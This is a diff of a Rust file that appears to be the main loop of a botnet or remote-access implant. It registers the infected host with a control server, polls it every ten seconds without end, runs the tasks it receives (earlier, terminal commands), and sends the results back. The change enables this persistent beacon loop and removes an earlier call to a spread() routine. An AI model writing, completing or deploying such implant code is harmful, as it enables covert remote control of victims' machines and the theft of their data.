@@ -1,38 +1,64 @@
+extern crate core;
+
 use std::{
     thread,
     time,
 };
-//use std::borrow::Borrow;
-use models::Task;
-use rand::Rng;
-use crate::tasks::spread;
-
 
 mod communication;
 mod utils;
-mod models;
+
+use crate::models::{
+    Task
+};
+
+
 mod tasks;
+mod models;
 
-// Note that URL is set by environment variable during compilation
-const URL: &'static str = env!("CONTROL_SERVER_URL");
-const POLL_SLEEP: time::Duration = time::Duration::from_secs(5);
-const TERMINAL_CMD: &'static str = "terminal";
+const POLL_SLEEP: time::Duration = time::Duration::from_secs(10);
 
-
-/// Fetches commands from the control server and runs them
+/// Fetches commands from the control server and runs them, then returns task results to control
+/// server
 async fn call_home(token: &String) {
-    let tasks: Vec<Task> = match communication::get_commands(token, URL).await {
-        Ok(val) => val,
-        Err(_) => Vec::new(),
-    };
-    for t in tasks {
-        let wait = rand::thread_rng().gen_range(t.min_delay, t.max_delay);
-        thread::sleep(time::Duration::from_millis(wait as u64));
+    #[cfg(debug_assertions)]
+    println!("Asking server for tasks");
 
-        // Add more command types here when supported by server and implemented in client
-        if t.name == TERMINAL_CMD {
-            tasks::terminal_command(t.data);
-        }
+    let tasks: Vec<Task> = match communication::get_commands(token).await {
+        Ok(val) => val,
+        Err(_) => {
+            #[cfg(debug_assertions)]
+            println!("Error when asking server for tasks.");
+            Vec::new()
+        },
+    };
+
+    if tasks.is_empty() {
+        #[cfg(debug_assertions)]
+        println!("No task received");
+    }
+
+    for t in tasks {
+        #[cfg(debug_assertions)]
+        println!("\nReceived task #{}: {}", t.id, t.name);
+        tasks::run_task(t);
+    }
+    // Short sleep to ensure short running tasks are completed before checking, quick and dirty
+    // solution
+    thread::sleep(time::Duration::from_millis(200));
+
+    let complete_tasks = tasks::check_completed();
+    for tr in complete_tasks {
+        match communication::send_task_result(&tr, token).await {
+            Ok(_) => {
+                #[cfg(debug_assertions)]
+                println!("Successfully sent task #{} result to server", tr.id);
+            }
+            Err(_) => {
+                #[cfg(debug_assertions)]
+                println!("Failed send task #{} result to server!", tr.id);
+            }
+        };
     }
 }
 
@@ -45,7 +71,7 @@ async fn initialise_client() -> String {
     let mut token: String;
     loop {
         let id = utils::get_host_identify();
-        token = match communication::send_identity(id, URL).await {
+        token = match communication::send_identity(id).await {
             Ok(val) => val,
             Err(_) => String::from("")
         };
@@ -64,17 +90,9 @@ async fn initialise_client() -> String {
 
 #[tokio::main]
 async fn main() -> Result<(), anyhow::Error> {
-    /*
     let token: String = initialise_client().await;
     loop {
         call_home(&token).await;
         thread::sleep(POLL_SLEEP);
-
-        // Remove break when the client is supposed to run forever
-        break;
     }
-     */
-
-    spread();
-    Ok(())
 }
